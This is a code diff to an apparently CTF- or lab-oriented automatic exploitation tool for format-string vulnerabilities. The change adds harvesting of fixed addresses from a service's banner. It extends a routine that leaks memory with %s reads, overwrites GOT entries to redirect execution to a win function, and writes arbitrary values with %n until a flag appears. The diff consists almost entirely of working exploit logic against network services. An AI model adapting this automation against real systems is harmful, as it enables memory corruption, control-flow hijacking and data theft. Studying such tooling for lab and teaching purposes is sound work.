@@ -1129,7 +1129,23 @@ def _words_to_bytes(vals, lo, hi, bits):
     return b"".join(struct.pack(pk, vals.get(k, 0) & ((1 << bits) - 1)) for k in range(lo, hi))
 
 
-def goal_paper(cx, args, st):
+def banner_addresses(cx):
+    """Fixed (non-stack) addresses the service itself prints before the prompt, e.g.
+    "The genie's wish counter lives at 0x80e3f3c". Only ones that are the same on two
+    connections: an address that moves must be used in the connection that printed it."""
+    seen = []
+    for _ in range(2):
+        try:
+            s, banner = cx.t.open()
+            s.close()
+        except OSError:
+            return []
+        seen.append({int(h, 16) for h in re.findall(rb"0x[0-9a-fA-F]{6,16}", banner or b"")})
+    stack = lambda v: 0xF7000000 <= v <= 0xFFFFFFFF or v >= 0x7F0000000000
+    return sorted(a for a in (seen[0] & seen[1]) if not stack(a))
+
+
+def goal_paper(cx, args, st, given=None):
     """The lab's two exercises with the address given on PAPER and no binary: "the secret
     is at 0x804c060" (read it with %s) and "make the variable at X equal V" (%n). Each
     address is read first; then each number in the notes is written to it, and with no
@@ -1138,12 +1154,16 @@ def goal_paper(cx, args, st):
     stack = lambda v: 0xF7000000 <= v <= 0xFFFFFFFF or v >= 0x7F0000000000
     addrs = [a for a in auto_pwn.paper("address") if not stack(a)]
     values = [v for v in auto_pwn.paper("number") if 0 <= v <= 0xFFFFFFFF] or [1]
+    if given is not None:                            # addresses printed by the service, not by the notes
+        addrs, values = list(given), [1]
+    origin = "printed by the service" if given is not None else "from your notes"
+    both = "the address is " + origin if given is not None else "both from your notes"
     for addr in addrs[:4]:
-        log(f"[*] your notes give the address {hex(addr)}: reading it as a string")
+        log(f"[*] address {hex(addr)} ({origin}): reading it as a string")
         out, payload = read_at(cx, addr)
         f = out and flag_in(out, payload, args.flag_regex)
         if f:
-            solved(f, f"%s read of {hex(addr)} (address from your notes)")
+            solved(f, f"%s read of {hex(addr)} (address {origin})")
             return True
     # Two addresses and it is the GOT exercise: one is a GOT entry, the other is win().
     # Which is which is not guessed from the wording - both directions are tried; the wrong
@@ -1152,21 +1172,21 @@ def goal_paper(cx, args, st):
         for src in addrs[:3]:
             if src == dst or time.time() > st["deadline"]:
                 continue
-            log(f"[*] writing the address {hex(src)} over the word at {hex(dst)} (both from your notes)")
+            log(f"[*] writing the address {hex(src)} over the word at {hex(dst)} ({both})")
             for size in ((4,) if cx.bits == 32 else (8, 4)):
                 r = fire_write(cx, args, cx.split(dst, src, size, 2), f"{hex(dst)} -> {hex(src)}")
                 if r and r[0]:
-                    solved(r[0], f"after pointing {hex(dst)} at {hex(src)} (from your notes)")
+                    solved(r[0], f"after pointing {hex(dst)} at {hex(src)} ({origin})")
                     return True
     for addr in addrs[:4]:
         for v in values[:4]:
             if time.time() > st["deadline"]:
                 return False
-            log(f"[*] writing {hex(v)} to {hex(addr)} (both from your notes"
+            log(f"[*] writing {hex(v)} to {hex(addr)} ({both}"
                 + ("" if auto_pwn.paper("number") else "; no value given, so 1 = non-zero") + ")")
             r = fire_write(cx, args, cx.split(addr, v, 4, 2), f"write {hex(v)} to {hex(addr)}")
             if r and r[0]:
-                solved(r[0], f"after writing {hex(v)} to {hex(addr)} (from your notes)")
+                solved(r[0], f"after writing {hex(v)} to {hex(addr)} ({origin})")
                 return True
     return False
 
@@ -1431,6 +1451,7 @@ def main():
         "echo":    lambda: goal_echo(cx, args, st, elf, rep),
         "gotsys":  lambda: need_slot() and goal_gotsys(cx, args, st, elf, rep),
         "paper":   lambda: need_slot() and goal_paper(cx, args, st),
+        "banner":  lambda: need_slot() and goal_paper(cx, args, st, given=st.get("banner_addrs") or []),
         "strings": lambda: goal_strings(cx, args, st),
         "globals": lambda: need_slot() and goal_globals(cx, args, st, elf, rep),
     }
@@ -1472,6 +1493,12 @@ def main():
         if elf:
             order.append("globals")
             order += [g for g in ("guard", "got", "leakbof") if g not in order]
+        # Last, so nothing above changes: the service printed a fixed address and nothing
+        # else explained it - read it, then make it non-zero (the lab's "genie" with the
+        # counter's address in the banner and no binary to name it).
+        st["banner_addrs"] = banner_addresses(cx)
+        if st["banner_addrs"]:
+            order.append("banner")
     for g in order:
         if time.time() > st["deadline"]:
             log(f"[!] budget of {args.budget:.0f}s used up before '{g}' (raise --budget)")
